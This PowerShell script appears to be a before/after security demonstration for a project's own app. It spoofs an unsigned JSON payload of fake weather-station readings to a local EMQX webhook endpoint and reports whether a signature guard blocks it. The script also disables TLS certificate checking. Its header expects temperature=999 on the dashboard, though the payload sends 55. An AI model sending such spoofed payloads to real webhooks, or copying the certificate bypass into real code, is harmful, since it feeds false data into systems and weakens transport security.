# Attack M11 — EMQX Webhook Spoofing (no signature header)
#
# Usage:
#   .\attack.ps1                  # hits https://localhost:3000
#   .\attack.ps1 -Host other.url  # custom host
#
# BEFORE protection: WEBHOOK_GUARD_ENABLED=false in lib/security/emqxWebhookGuard.ts
#   Expected: HTTP 200 {"success":true} -> dashboard now shows temperature=999
# AFTER protection:  WEBHOOK_GUARD_ENABLED=true
#   Expected: HTTP 401 {"success":false,"error":"Unauthorized."}

param(
    [string]$HostUrl = "https://localhost:3000"
)

$ErrorActionPreference = "Stop"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

# Use in-range but obviously-tampered values so the payload passes
# validateTelemetry() — the point of M11 is that ANY unsigned payload is
# accepted, not that out-of-range data passes.
$body = @{
    device_id   = "STATION-ATTACK-DEMO"
    temperature = 55      # visibly extreme heatwave, still in [-50, 80]
    humidity    = 99      # in [0, 100]
    rainfall    = 499     # in [0, 500]
    receivedAt  = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
} | ConvertTo-Json -Compress

Write-Host "→ POST $HostUrl/api/emqx-webhook  (no x-emqx-signature header)" -ForegroundColor Cyan
Write-Host "  body: $body" -ForegroundColor DarkGray
Write-Host ""

try {
    $resp = Invoke-WebRequest `
        -Uri "$HostUrl/api/emqx-webhook" `
        -Method POST `
        -ContentType "application/json" `
        -Body $body `
        -SkipCertificateCheck `
        -ErrorAction Stop
    Write-Host "HTTP $($resp.StatusCode)" -ForegroundColor Green
    Write-Host $resp.Content
    Write-Host ""
    Write-Host "VULNERABILITY EXPLOITED — webhook accepted unsigned payload." -ForegroundColor Red
} catch {
    $code = $_.Exception.Response.StatusCode.value__
    $body = if ($_.ErrorDetails) { $_.ErrorDetails.Message } else { $_.Exception.Message }
    Write-Host "HTTP $code" -ForegroundColor Yellow
    Write-Host $body
    Write-Host ""
    if ($code -eq 401) {
        Write-Host "ATTACK BLOCKED — signature guard rejected." -ForegroundColor Green
    } else {
        Write-Host "UNEXPECTED — see status code above." -ForegroundColor Magenta
    }
}
